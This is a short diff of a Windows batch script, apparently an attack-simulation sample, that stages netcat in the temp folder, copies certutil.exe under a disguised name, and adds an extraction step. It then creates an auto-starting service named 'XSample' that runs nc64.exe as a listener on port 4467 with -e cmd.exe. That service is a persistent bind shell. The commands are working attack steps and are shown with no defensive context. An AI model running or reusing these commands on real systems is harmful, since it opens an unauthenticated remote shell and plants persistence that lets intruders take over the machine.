@@ -8,6 +8,7 @@ copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
 %Temp%\7z.exe a -mx1 %Temp%\netcat-win32-1.11.zip %Temp%\
 
+%Temp%\7z.exe x %Temp%\netcat-win32-1.11.zip -o%Temp%\
 
 sc create XSample binPath= "cmd.exe /C %Temp%\netcat-1.11\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
 
